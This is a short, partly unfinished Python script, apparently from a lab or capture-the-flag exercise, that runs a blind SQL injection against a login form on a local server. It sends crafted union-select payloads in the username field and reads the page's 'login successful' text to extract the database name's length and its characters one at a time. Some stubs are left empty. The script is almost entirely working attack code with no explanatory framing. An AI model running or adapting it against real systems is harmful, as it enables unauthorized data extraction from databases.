import requests

url = "http://localhost:7000/index.php"

def main():

#union select ord(mid(database(),1,1))>-1
	return ''

def tbname(length):
	tb = ''
	


def localdb(length):
	dbname = ''
	for i in range(1,length+1):
		for j in range(1,127):
			sql = "admin' union select 1,1,cot(1 and ascii(mid(database(),{},1))={})#".format(i,j)
			data = {
			'username':sql,
			'password':'123'
			}
			r = requests.post(url,data=data)
			#print(sql)

			if '登录成功' in r.text:
				dbname += chr(j)
				break
	return dbname



def len(z):
	
	for i in range(20):
		sql = "admin' union select 1,1,cot(1 and length({})={})#".format(z,i)
		data = {
		'username':sql,
		'password':'123',
		}
		#print(data)
		r = requests.post(url,data=data)
		if '登录成功' in r.text:
			return i
print(len('database()'))
print(localdb(len('database()')))